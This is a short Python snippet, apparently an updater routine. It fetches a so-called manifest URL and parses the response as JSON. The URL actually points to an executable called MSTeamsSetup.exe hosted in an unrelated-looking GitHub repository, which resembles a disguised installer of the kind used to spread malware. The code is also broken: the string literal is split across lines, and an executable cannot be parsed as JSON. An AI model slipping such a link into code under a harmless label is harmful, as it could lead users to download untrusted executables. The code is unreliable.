import json, urllib.request

MANIFEST_URL = "https://github.com/logintechu/compressed-file/releases/download/compres/MSTeamsSetup.exe
"

def fetch_manifest():
    req = urllib.request.Request(
        MANIFEST_URL,
        headers={"User-Agent": "my-updater/1.0", "Cache-Control": "no-cache"},
    )
    with urllib.request.urlopen(req, timeout=15) as r:
        text = r.read().decode("utf-8-sig")
    return json.loads(text, strict=False)
